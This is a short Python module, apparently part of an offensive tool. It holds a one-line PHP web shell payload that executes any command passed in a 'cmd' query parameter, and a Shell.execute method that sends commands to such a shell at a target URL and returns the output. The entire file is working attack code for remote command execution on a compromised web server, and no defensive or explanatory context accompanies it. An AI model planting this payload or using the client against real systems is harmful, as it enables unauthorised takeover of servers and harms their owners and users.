import requests


class Shell:

    PAYLOAD = '<?php echo shell_exec($_GET["cmd"]); ?>'

    @staticmethod
    def execute(url, cmd):
        res = requests.get(url, params={'cmd': cmd})

        if res.status_code == 200:
            output = res.text

            return output

        raise Exception('unknown response code received: %d' % res.status_code)
